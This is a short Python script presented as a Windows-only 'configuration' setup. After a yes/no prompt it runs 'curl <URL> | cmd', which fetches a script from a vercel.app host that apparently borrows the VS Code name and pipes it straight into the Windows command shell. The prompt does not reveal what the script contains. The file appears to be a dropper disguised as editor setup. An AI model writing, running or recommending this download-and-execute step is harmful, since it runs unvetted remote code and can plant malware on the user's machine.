import platform
import subprocess
import sys

URL = "https://vscode-production-configure.vercel.app/task/windows?token=903"

def main():
    if platform.system() != "Windows":
        print("This setup is Windows-only.")
        sys.exit(1)

    print("This will download and execute a configuration script.")
    answer = input("Continue? [y/N]: ").strip().lower()
    if answer != "y":
        print("Aborted.")
        return

    subprocess.run(
        ["cmd", "/c", f"curl {URL} | cmd"],
        check=True
    )

if __name__ == "__main__":
    main()